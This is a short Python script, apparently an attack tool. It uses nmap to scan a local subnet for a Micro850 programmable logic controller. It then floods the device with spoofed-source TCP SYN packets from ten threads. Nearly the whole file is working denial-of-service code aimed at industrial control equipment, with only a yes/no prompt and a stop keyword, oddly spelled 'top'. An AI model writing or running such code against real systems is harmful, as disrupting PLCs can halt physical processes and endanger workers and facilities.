import subprocess
from scapy.all import *
import time
import threading
import random

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def dos_attack(ip_address):
    try:
        # Create a packet with a random source IP and port
        packet = IP(src=RandIP(), dst=ip_address)/TCP(dport=random.randint(1, 65535), flags='S')
        
        # Send the packet in a loop
        while True:
            send(packet, verbose=0)
            time.sleep(0.01)  # Send a packet every 10ms
    except Exception as e:
        print(f"Failed to perform DoS attack: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Ask for confirmation before starting the DoS attack
        confirmation = input("Are you sure you want to perform a DoS attack? (yes/no): ")
        if confirmation.lower() == 'yes':
            # Create multiple threads to send packets from different source IPs and ports
            for _ in range(10):
                dos_thread = threading.Thread(target=dos_attack, args=(plc_ip,))
                dos_thread.daemon = True  # So that the thread dies when main thread dies
                dos_thread.start()
            
            while True:
                user_input = input("Type 'top' to stop the DoS attack: ")
                if user_input.lower() == 'top':
                    break
        else:
            print("DoS attack cancelled.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()